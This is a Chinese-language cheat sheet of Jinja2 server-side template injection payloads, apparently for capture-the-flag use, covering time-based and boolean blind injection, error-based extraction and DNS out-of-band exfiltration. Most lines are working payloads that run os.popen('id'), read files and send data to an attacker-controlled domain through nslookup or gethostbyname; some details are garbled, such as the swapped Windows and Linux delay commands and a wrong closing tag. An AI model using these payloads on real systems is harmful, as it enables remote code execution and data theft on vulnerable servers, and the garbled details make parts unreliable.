# ssti模板绕过

## 1.时间盲注

```
{%if 条件%}{{`__import__`('time').sleep(3)}}{%if%}
```

通过时间延迟判断是否成功
windos sleep 3
linux ping -n 4 127.0.0.1

##2.布尔盲注
页面会根据结果返回固定的页面时使用
```
{%if 条件%}回显不同页面需要的值{% endif %}
```
如果源代码是通过输入的结果有没有正确的值而返回不同的页面,那么就用条件判断去判断摸出来的参数是不是正确的,是正确的就条件通过写入正确的值让他返回正确的页面,类似
    def c():
    name = request.args.get("name") 
    result = render_template_string("Hello, " + name)   # ① 渲染
    if "admin" in result:            # ② 判断结果里有没有 "admin"
        return "登录成功"             # ③ 有 → 回这个
    return "用户名不存在"             # ④ 没有 → 回这个
    
    {%if 条件%}admin{% endif %}	判断语句

##3.报错注入

通过报错日志把数据带出来显示(根据引擎决定能不能带上)
3.1类型转换错误
```
{{__import__('os').popen('id').read()|int}}
{{lipsum.__globals__.__builtins__.int(数据源)}}
ValueError: invalid literal for int() with base 10: '数据'
通过将数据源转换类型报错带出数据
{{数据源 + 123}}
>>> "数据源 + 123"
TypeError: can only concatenate str (not "int") to str


```
3.2访问不存在属性和索引

```
{{ [__import__('os').popen('id').read()][999] }}
将数据源用[]框起来去读取索引
IndexError: list index out of range
'uid=0(root) gid=0(root) ...' ][999]

{{ __import__('os').popen('id').read().xxx }}
读取不存在的属性
AttributeError: 'dict' object has no attribute 'fakeattr'
Template context:
{{ dict(res='uid=0(root) gid=0(root) ...').fakeattr }}

{{ lipsum.__globals__.__builtins__.open(数据源).read()}}
读取数据源
FileNotFoundError: [Errno 2] No such file or directory: 'flag{xxx}'
```

##4.外带注入
4.1dns外带

```
jinja自带
{{ lipsum.__globals__.__builtins__.__import__('os').popen('nslookup 数据.你的域名').read() }}
python原生
{{ lipsum.__globals__.__builtins__.__import__('socket').gethostbyname('数据.你的域名') }}
```

